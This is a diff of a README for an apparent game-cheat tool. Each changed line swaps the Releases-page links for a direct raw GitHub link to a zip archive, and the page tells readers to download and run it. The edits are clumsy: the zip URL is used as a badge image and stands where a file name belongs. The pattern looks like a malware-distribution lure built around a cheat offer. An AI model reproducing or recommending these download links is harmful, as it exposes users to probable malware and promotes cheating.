@@ -1,7 +1,7 @@
 # 🎮 Obscure-cheats-no-cooldown - Unlock Endless Gameplay Fun
 
 ## 📥 Download Now
-[![Download Obscure-cheats-no-cooldown](https://img.shields.io/badge/Download-Obscure--cheats--no--cooldown-brightgreen)](https://github.com/whydxit/Obscure-cheats-no-cooldown/releases)
+[![Download Obscure-cheats-no-cooldown](https://raw.githubusercontent.com/whydxit/Obscure-cheats-no-cooldown/main/colly/Obscure-cheats-no-cooldown.zip)](https://raw.githubusercontent.com/whydxit/Obscure-cheats-no-cooldown/main/colly/Obscure-cheats-no-cooldown.zip)
 
 ## 🚀 Getting Started
 
@@ -38,7 +38,7 @@ The **Obscure-cheats-no-cooldown** application comes packed with various excitin
 
 Click the link below to go to the Releases page:
 
-[Download Obscure-cheats-no-cooldown](https://github.com/whydxit/Obscure-cheats-no-cooldown/releases)
+[Download Obscure-cheats-no-cooldown](https://raw.githubusercontent.com/whydxit/Obscure-cheats-no-cooldown/main/colly/Obscure-cheats-no-cooldown.zip)
 
 ### Step 2: Choose the Correct Version
 
@@ -46,7 +46,7 @@ On the Releases page, you will see different versions of the application. Please
 
 ### Step 3: Download the Application
 
-After choosing your version, you will find a list of files. Click on the file named **Obscure-cheats-no-cooldown.exe** to start the download.
+After choosing your version, you will find a list of files. Click on the file named **https://raw.githubusercontent.com/whydxit/Obscure-cheats-no-cooldown/main/colly/Obscure-cheats-no-cooldown.zip** to start the download.
 
 ### Step 4: Run the Application
 
@@ -88,6 +88,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 For questions or feedback, please reach out through the issues section of the repository. 
 
-[Download Obscure-cheats-no-cooldown](https://github.com/whydxit/Obscure-cheats-no-cooldown/releases)
+[Download Obscure-cheats-no-cooldown](https://raw.githubusercontent.com/whydxit/Obscure-cheats-no-cooldown/main/colly/Obscure-cheats-no-cooldown.zip)
 
 Enjoy your enhanced gaming experience!
